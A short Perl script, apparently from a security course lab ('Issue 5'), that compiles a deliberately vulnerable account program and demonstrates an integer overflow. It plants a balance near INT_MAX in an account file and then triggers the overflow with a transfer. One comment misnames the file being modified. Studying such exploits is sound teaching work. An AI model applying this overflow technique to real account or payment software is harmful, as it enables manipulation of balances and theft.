#!/usr/bin/perl

#Issue 5: Exploit a
#Aim: Integer Overflow in main.

#To compile account_bad.c
system("gcc -g -o /vulnerable/account_bad /vulnerable/account_bad.c");

#Create a hacker account.
$ENV{USER} = 'hacker';
system("/vulnerable/account_bad hackerPassword");

#Create an account for otherAccount.
$ENV{USER} = 'otherAccount';
system("/vulnerable/account_bad otherAccountPass");

#Modify hacker file in accounts directory to have amount close to INT_MAX.
#INT_MAX 2147483647
system("echo 2147483600 > /vulnerable/accounts/otherAccount");

$ENV{USER} = 'hacker';
#Transfer from hacker to otherAccount to cause integer overflow.
system("/vulnerable/account_bad hackerPassword 60 otherAccount");

$ENV{USER} = 'otherAccount';
#verify integer overflow by printing balance of otherAccount.
print "#Below is balance of otherAccount\n";
system("/vulnerable/account_bad otherAccountPass");
